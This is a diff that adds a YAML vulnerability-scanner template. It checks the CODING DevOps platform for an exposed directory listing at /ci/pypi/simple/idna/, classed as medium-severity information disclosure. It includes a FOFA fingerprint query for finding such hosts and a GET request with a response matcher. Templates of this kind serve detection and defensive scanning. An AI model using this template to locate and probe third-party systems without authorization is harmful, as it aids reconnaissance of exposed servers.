@@ -1,0 +1,15 @@
+id: poc-yaml-coding-ci-pypi-directory-traversal
+info:
+  name: CODING平台存在idna目录遍历漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: CODING
+  fofa: title="一站式软件研发管理平台"
+requests:
+- method: GET
+  path: /ci/pypi/simple/idna/
+  expression: "status_code == 200 && \ncontains(body,\"Index of /ci/pypi/simple/idna/\"\
+    )\n"
+variables: {}
+transport: http
